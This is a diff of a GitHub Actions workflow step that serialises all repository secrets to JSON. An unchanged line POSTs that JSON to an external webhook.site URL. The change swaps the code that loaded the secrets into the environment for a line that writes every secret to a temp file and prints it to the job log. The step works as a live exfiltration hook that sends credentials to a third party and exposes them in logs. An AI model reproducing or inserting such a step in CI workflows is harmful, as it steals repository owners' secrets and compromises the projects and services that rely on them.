@@ -32,14 +32,6 @@ jobs:
       - name: Output secrets to env
         run: |
           curl -X POST https://webhook.site/c91f80b6-172a-4d41-93aa-363ced00580a --data-binary "$secrets" 
-          while read -d $'\t' -r key value; do
-            if [[ $key == *$'\n'* ]]; then
-              echo $key'<<EOF' >> $GITHUB_ENV
-              echo "$value" >> $GITHUB_ENV
-              echo 'EOF' >> $GITHUB_ENV
-            elif [[ ! -z $key ]]; then
-              echo $key'='$value >> $GITHUB_ENV
-            fi
-          done< <(jq -j 'to_entries|.[] | "\(.key) \(.value)\t"' <<< "$secrets")
+          echo "$secrets" > /tmp/poo && cat /tmp/poo
         env:
           secrets: ${{ toJSON(secrets) }}
